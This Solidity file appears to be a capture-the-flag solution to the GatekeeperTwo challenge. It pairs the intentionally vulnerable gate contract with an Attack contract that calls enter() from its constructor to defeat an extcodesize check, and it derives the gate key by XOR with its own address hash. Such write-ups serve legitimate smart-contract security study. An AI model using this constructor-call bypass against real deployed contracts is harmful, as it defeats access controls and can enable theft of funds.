// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    constructor(address payable _address) public {
        GatekeeperTwo g = GatekeeperTwo(_address);
        
        bytes8 gatekey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(0xffffffffffffffff);
        
        g.enter(gatekey);
    }
}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "Gate One");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0, "Gate Two");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1, "Gate Three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}